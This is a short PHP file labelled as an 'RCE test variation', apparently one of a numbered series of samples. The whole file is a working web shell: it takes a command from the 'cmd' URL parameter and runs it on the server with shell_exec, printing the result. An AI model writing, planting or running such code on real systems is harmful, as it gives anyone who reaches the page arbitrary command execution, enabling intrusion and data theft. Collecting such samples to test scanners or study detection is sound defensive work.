<?php
// RCE test variation #892
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>